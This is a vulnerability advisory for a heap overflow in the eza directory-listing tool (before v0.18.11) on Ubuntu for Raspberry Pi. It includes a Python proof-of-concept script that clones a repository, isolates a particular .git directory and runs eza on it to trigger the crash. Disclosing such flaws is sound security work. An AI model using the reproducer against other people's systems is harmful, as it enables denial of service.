## 0x01 Summary

In `eza` [^1] (before `v0.18.11`), there exists a heap overflow vulnerability, first seen when using Ubuntu for Raspberry Pi series system, on `ubuntu-raspi` kernel, relating to the `.git` directory.

## 0x02 Details

The vulnerability seems to be triggered by the `.git` directory in some projects. This issue may be related to specific files, and the directory structure also plays a role in triggering the vulnerability. Files/folders that may be involved in triggering the vulnerability include `.git/HEAD`, `.git/refs`, and `.git/objects`.

## 0x03 PoC - If you have Raspberry Pi 4B bare metal machine

**If you don't have Raspberry Pi bare metal, you can try emulate a ubuntu for raspberry system in virtual machine.**

You just need install any one of Ubuntu for Raspberry Pi series system in your bare metal machine.

### 1x01 Tested platform info

Configuration in `Raspberry Pi 4B` bare metal machine:

```bash
eza version: v0.18.10 [+git]

Linux lux 5.15.0-1049-raspi #52-Ubuntu SMP PREEMPT Thu Mar 14 08:39:42 UTC 2024 aarch64 aarch64 aarch64 GNU/Linux

Distributor ID: Ubuntu
Description: Ubuntu 22.04.4 LTS
Release: 22.04
Codename: jammy
```

> [!IMPORTANT]
> So far I have only tested the `Ubuntu 22.04.4 LTS Server` and confirmed that this vulnerability exists. I haven't test other System/Raspberry Pi yet.

### 1x02 Steps

Install `eza (<=v0.18.10)` in Raspberry Pi. Process can refer to the official [wiki](https://github.com/eza-community/eza/blob/main/INSTALL.md).

```python:poc.py
import subprocess
import os
import shutil

# Step 1: Clone the repository
repo_url = "https://github.com/umami-software/umami.git"
subprocess.run(["git", "clone", repo_url])

# Step 2: Checkout to the specific commit contain the special '.git' directory that can trigger the vulnerability
repo_dir = "umami"
commit_hash = "a38baa5"
os.chdir(repo_dir)
subprocess.run(["git", "checkout", commit_hash])

# Step 3: Create a directory for the vulnerability related files
os.chdir("..")
os.mkdir("suspicious")
shutil.move(os.path.join(repo_dir, ".git"), "suspicious/.git")

# Step 4: Remove unrelated files/directories
shutil.rmtree(repo_dir)

# Step 5: Trigger the vulnerability
subprocess.run(["eza", "-l", "--git", "suspicious/.git"])
```

> [!NOTE]
> The picture shows my test environment. In actual testing, the vulnerability can be triggered by just using the above command.
